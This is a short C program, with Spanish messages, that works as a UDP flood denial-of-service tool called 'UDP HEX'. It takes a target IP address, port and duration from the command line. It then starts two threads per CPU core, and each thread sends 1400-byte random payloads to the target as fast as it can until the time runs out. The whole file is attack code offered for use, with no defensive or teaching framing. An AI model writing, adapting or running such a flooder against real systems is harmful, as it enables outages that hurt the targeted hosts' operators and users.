#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <time.h>
#include <pthread.h>

#define SIZE 1400

struct argsattack{
    char *ip;
    unsigned short port;
    time_t start;
    int duracion;
};

int countcpu(void){
    int cpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if(cpu <= 0){
        fprintf(stderr, "\n[ UDP HEX ] Error de conteo de cpus");
        exit(1);
    }
    return cpu * 2; // Probar la *2
}

void *udp(void *arg){
    struct argsattack *args = (struct argsattack *)arg;
    unsigned char payload[SIZE];
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0){
        perror("sock");
        return NULL;
    }
    
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(args->port);
    dst.sin_addr.s_addr = inet_addr(args->ip);
    
    connect(sock, (struct sockaddr*)&dst, sizeof(dst));
    
    unsigned int seed = time(NULL) ^ pthread_self();
    
    while(time(NULL) - args->start < args->duracion){
        for(int i = 0; i < SIZE; i++){
            payload[i] = rand_r(&seed) & 0xFF;
        }
        
        send(sock, payload, SIZE, 0);
}
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]){
    if(argc != 4){
        fprintf(stderr, "uso: ./%s <ip> <port> <time>", argv[0]);
        return 1;
    }
    struct argsattack args;
    args.ip = argv[1];
    args.port = atoi(argv[2]);
    args.duracion = atoi(argv[3]);
    time_t inicio = time(NULL);
    args.start = inicio;
    
    int tam = countcpu();
    
    pthread_t *thr = calloc(tam, sizeof(pthread_t));
    if(!thr){
        fprintf(stderr, "\n[ UDP HEX ] Error de asignacion de memoria.\n");
        exit(1);
    }
    
    for(int i = 0; i < tam; i++){
        if(pthread_create(&thr[i], NULL, udp, &args) != 0){
            fprintf(stderr, "\n[ UDP HEX ] Error de inicializacion de hilos\n");
            free(thr);
            exit(1);
        }
    }
    
    printf("[ UDP HEX ] Send ip: %s port: %hd time: %d", args.ip, args.port, args.duracion);
    fflush(stdout);
    
    for(int i = 0; i < tam; i++){
        pthread_join(thr[i], NULL);
    }
    
    free(thr);
    return 0;
}
